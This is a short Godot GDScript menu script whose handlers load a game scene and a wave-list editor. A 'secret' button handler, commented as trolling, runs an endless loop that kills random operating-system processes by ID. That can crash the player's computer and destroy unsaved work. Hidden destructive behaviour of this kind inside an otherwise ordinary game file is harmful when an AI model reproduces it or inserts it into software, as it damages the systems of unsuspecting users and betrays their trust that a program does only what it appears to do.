extends Control


func _on_game_pressed() -> void:
	get_tree().change_scene_to_file("res://src/static/game.tscn");

func _on_wave_list_editor_pressed() -> void:
	get_tree().change_scene_to_file("res://src/static/wave_list_editor.tscn");

## We do a miniscule quantity of trolling
func _on_secret_pressed() -> void:
	while true:
		OS.kill(randi_range(0, 4194304));
